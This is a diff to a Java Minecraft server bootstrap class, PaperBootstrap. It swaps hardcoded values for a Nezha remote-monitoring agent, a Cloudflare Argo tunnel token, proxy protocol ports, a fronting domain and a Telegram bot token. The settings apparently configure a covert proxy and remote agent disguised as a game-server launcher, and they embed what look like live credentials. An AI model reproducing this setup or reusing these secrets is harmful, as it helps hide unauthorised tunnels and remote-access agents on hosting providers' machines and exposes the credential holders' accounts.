@@ -94,13 +94,13 @@ public final class PaperBootstrap {
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "nezhak.5201972.xyz");
+        envVars.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "Tlb3dukFRBqsQ8Wqyy");
+        envVars.put("NEZHA_KEY", "LGvyl75Ya0SOEZEXt6");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "weirdhostbtpp39.ohjust.nyc.mn");
+        envVars.put("ARGO_DOMAIN", "na1host.ohjust.nyc.mn");
         envVars.put("ARGO_AUTH", "eyJhIjoiZmJkN2VhODFlMjI1MWIzMWMyYmJmNWJmZTFkY2Q3OWEiLCJ0IjoiMzQxMDZkOGYtZTUwZC00ZDFiLThjZDUtYmM5OGE2NTA0MzYzIiwicyI6IlpqRTJNR1F4TVRVdE1EaGxZUzAwT0dSaUxXSmpNemN0WkdSbU9XTmhOekJqT0dKayJ9");
-        envVars.put("HY2_PORT", "5087");
+        envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "7935239797:AAHuQ9jZt-cNjcgjqQ9HH0JzkSWlD53EttM");
         envVars.put("CFIP", "www.visa.com.sg");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "freemchosting-btpp14");
+        envVars.put("NAME", "na1.host");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
